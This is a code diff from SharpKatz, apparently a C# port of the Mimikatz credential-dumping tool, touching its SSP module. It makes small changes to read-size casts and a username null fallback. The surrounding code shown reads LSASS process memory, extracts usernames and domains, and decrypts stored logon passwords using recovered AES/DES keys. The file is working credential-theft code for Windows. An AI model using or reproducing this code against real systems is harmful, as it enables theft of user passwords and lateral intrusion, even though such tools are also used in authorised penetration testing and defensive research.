@@ -50,14 +50,14 @@ namespace SharpKatz.Module
 
             do
             {
-                byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, llCurrent, Convert.ToUInt64(Marshal.SizeOf(typeof(KIWI_SSP_CREDENTIAL_LIST_ENTRY))));
+                byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, llCurrent, Marshal.SizeOf(typeof(KIWI_SSP_CREDENTIAL_LIST_ENTRY)));
                 entry = Utility.ReadStruct<KIWI_SSP_CREDENTIAL_LIST_ENTRY>(entryBytes);
 
                 string username = Utility.ExtractUnicodeStringString(hLsass, entry.credentials.UserName);
                 string domain = Utility.ExtractUnicodeStringString(hLsass, entry.credentials.Domaine);
                 int reference = (int)entry.References;
 
-                byte[] msvPasswordBytes = Utility.ReadFromLsass(ref hLsass, entry.credentials.Password.Buffer, (ulong)entry.credentials.Password.MaximumLength);
+                byte[] msvPasswordBytes = Utility.ReadFromLsass(ref hLsass, entry.credentials.Password.Buffer, entry.credentials.Password.MaximumLength);
 
                 byte[] msvDecryptedPasswordBytes = BCrypt.DecryptCredentials(msvPasswordBytes, iv, aeskey, deskey);
 
@@ -74,15 +74,8 @@ namespace SharpKatz.Module
                     LUID luid = entry.LogonId;
 
                     Credential.Ssp sspentry = new Credential.Ssp();
-                    sspentry.Reference = reference;
-                    if (!string.IsNullOrEmpty(username))
-                    {
-                        sspentry.UserName = username;
-                    }
-                    else
-                    {
-                        sspentry.UserName = "[NULL]";
-                    }
+                    sspentry.Reference = reference; 
+                    sspentry.UserName = username;
 
                     if (!string.IsNullOrEmpty(domain))
                     {
